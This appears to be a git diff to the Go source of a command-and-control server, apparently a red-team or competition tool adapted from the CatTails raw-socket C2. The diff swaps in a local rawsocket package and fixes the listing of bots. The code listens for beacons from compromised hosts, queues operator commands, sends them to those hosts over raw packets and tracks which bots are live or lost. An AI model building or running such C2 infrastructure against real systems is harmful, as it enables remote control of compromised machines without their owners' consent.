@@ -1,10 +1,10 @@
 package main
 
 /*
-Working on C2, Currently using Cattails C2 source as POC.
+Working on C2, Currently using rawsocket C2 source as POC.
 Additional functionality and code edits will be made in the future.
 
-Look at the github repo for Cattails for more information :3
+Look at the github repo for rawsocket for more information :3
 */
 
 import (
@@ -13,12 +13,12 @@ import (
 	"log"
 	"net"
 	"os"
+	"psovaya/pkg/rawsocket"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/google/gopacket"
-	"github.com/oneNutW0nder/CatTails/cattails"
 	"golang.org/x/sys/unix"
 )
 
@@ -62,9 +62,10 @@ func banner() {
 	fmt.Println(string(b))
 }
 
-func xorMsg(msg []string) {
-	fmt.Print("Hello")
-}
+// Implement
+// func xorMsg(msg []string) {
+// 	 fmt.Print("Hello")
+// }
 
 func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 	// Forever loop to respond to bots
@@ -74,7 +75,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		bot := <-listen
 
 		// Make a socket for sending
-		fd := cattails.NewSocket()
+		fd := rawsocket.NewSocket()
 
 		/* New Code */
 		queueLen := len(cmdQueue)
@@ -86,8 +87,8 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 				queueLen--
 
 				/* Send Command */
-				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(cmdCurr))
-				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+				packet := rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateCommand(cmdCurr))
+				rawsocket.SendPacket(fd, iface, rawsocket.CreateAddrStruct(iface), packet)
 				fmt.Println("[+] Executed Task:", bot.Hostname, "(", bot.IP, ")")
 				unix.Close(fd)
 				// updatepwnboard
@@ -104,8 +105,7 @@ func cliList(cmdArgs []string) {
 	if len(cmdArgs) > 1 {
 		if cmdArgs[1] == "lost" {
 			live = false
-		}
-		if cmdArgs[1] == "live" {
+		} else if cmdArgs[1] == "live" {
 			lost = false
 		} else {
 			fmt.Printf("\x1b[31mUnknown List Arguement : %v\n\x1b[0m", cmdArgs[1])
@@ -118,14 +118,14 @@ func cliList(cmdArgs []string) {
 		if delta.Seconds() > float64(maxDelta) && lost {
 			fmt.Printf("\x1b[31m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
 		}
-		if live {
+		if delta.Seconds() < float64(maxDelta) && live {
 			fmt.Printf("\x1b[32m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
 		}
 	}
 }
 
-func cli() bool {
-	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    info: Obtain info from payload or server"
+func cli() {
+	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    list: list clients\n     info: Obtain info from payload or server"
 	for {
 		// reader type
 		reader := bufio.NewReader(os.Stdin)
@@ -226,21 +226,21 @@ func main() {
 	// Zoi Time
 	banner()
 
-	/* Cattails init */
+	/* rawsocket init */
 	// Create a BPF vm for filtering
-	vm := cattails.CreateBPFVM(cattails.FilterRaw)
+	vm := rawsocket.CreateBPFVM(rawsocket.FilterRaw)
 
 	// Create a socket for reading
-	readfd := cattails.NewSocket()
+	readfd := rawsocket.NewSocket()
 	defer unix.Close(readfd)
 
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := cattails.GetOutwardIface("192.168.56.10:80")
+	iface, myIP := rawsocket.GetOutwardIface("192.168.56.10:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
-	dstMAC, err := cattails.GetRouterMAC()
+	dstMAC, err := rawsocket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -255,7 +255,7 @@ func main() {
 
 	// This needs to be on main thread
 	for {
-		packet := cattails.ServerReadPacket(readfd, vm)
+		packet := rawsocket.ServerReadPacket(readfd, vm)
 		// Pass Packet to process function
 		if packet != nil {
 			go processPacket(packet, listen)
